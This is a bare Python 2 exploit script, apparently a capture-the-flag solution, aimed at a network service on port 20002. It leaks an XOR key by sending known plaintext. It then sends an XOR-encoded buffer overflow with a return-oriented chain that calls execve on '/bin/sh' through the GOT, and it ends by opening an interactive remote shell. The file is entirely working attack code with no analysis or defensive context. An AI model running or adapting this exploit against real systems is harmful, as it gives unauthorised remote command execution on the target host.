
#!/usr/bin/python
import com
import struct

def enc(s, keybuf):
        pt=""
        for i in range(0,len(s)/4):
                o = struct.unpack("I",s[i*4:i*4+4])[0]
                o = o^keybuf[i%32]
                pt+=struct.pack("I",o)
        return pt

so = com.connect(20002,1)
print com.recvTime(so)

s = "E"+struct.pack("I",0x80)+"A"*128
so.send(s)

s = com.recvTime(so,128+124)[124:]
print len(s)

keybuf=[]
#XOR the output to cancel the original XOR
for i in range(0,32):
        o=struct.unpack("I",s[i*4:i*4+4])[0]
        o=o^struct.unpack("I","AAAA")[0]
        keybuf.append(o)


evp=0x804b3d8 #GOT of execve
sh=0xb77ee8da #"/bin/sh"
pebx=0x08048818 #pop %ebx | ret
cebx=0x08049fe3 #call *(%ebx)

pl = "A"*0x20010
pl+=struct.pack("I",pebx)
pl+=struct.pack("I",evp)
pl+=struct.pack("I",cebx)
pl+=struct.pack("I",sh)
pl+=struct.pack("I",0)*2

s ="E"+struct.pack("I",len(pl))
s+=enc(pl,keybuf)
s+="Q"

so.send(s)

#eat up all the output
for i in range(0,0x20014/4096+1):
        com.recvTime(so)
print com.recvTime(so)

com.useShell(so)
